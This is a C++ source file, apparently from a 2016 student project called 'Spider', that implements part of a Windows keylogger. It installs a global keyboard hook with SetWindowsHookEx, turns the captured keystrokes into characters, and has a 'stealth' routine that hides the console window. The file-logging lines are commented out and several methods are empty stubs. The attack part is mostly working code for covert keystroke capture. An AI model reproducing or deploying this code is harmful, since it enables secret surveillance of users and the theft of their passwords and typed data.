//
// Keylog.cpp for Spider client in C:\Users\vezia_l\Documents\Epitech\cpp_spider\client\inc
// 
// Made by Louis VEZIA
// Login   <vezia_l@epitech.eu>
// 
// Started on  Tue Nov  1 13:50:30 2016 Louis VEZIA
// Last update Tue Nov  1 13:50:48 2016 Louis VEZIA
//

#include "Keylog.hh"

//static HHOOK hkb;

Keylog::Keylog()
{
	mousePosX = 0;
	mousePosY = 0;
	keyPressed = 0;
}

Keylog::~Keylog()
{
}

int		Keylog::getKey()
{

	return (0);
}

int		Keylog::getMouse()
{
	std::cout << "Hello Mouse !" << std::endl;
	return (0);
}

int		Keylog::getForeground()
{
	fg = GetForegroundWindow();

	return (0);
}

int		Keylog::stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
	return (0);
}


LRESULT CALLBACK Keylog::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	char ch;

	std::cout << "In keykey" << std::endl;
	if (((DWORD)lParam & 0x40000000) && (HC_ACTION == nCode))
	{
		std::cout << "In in keyboardproc" << std::endl;
		if ((wParam == VK_SPACE) || (wParam == VK_RETURN) || (wParam >= 0x2f) && (wParam <= 0x100))
		{
			if (wParam == VK_RETURN)
			{
				ch = '\n';
				//fwrite(&ch, 1, 1, myKeylogfile);
				std::cout << &ch << std::endl;
			}
			else
			{
				BYTE ks[256];
				GetKeyboardState(ks);

				WORD w;
				UINT scan = 0;
				ToAscii(wParam, scan, ks, &w, 0);
				ch = char(w);
				//fwrite(&ch, 1, 1, myKeylogfile);
				std::cout << &ch << std::endl;
			}
			//fclose(myKeylogfile);
		}
	}

	LRESULT RetVal = CallNextHookEx(0, nCode, wParam, lParam);
	return  RetVal;
}

bool Keylog::installhook()
{
	//fclose(myKeylogfile);
	std::cout << "- in installhook" << std::endl;
	hkb = SetWindowsHookEx(WH_KEYBOARD, &KeyboardProc, NULL, 0);
	std::cout << hkb << std::endl;
	std::cout << "- out installhook" << std::endl;
	return true;
}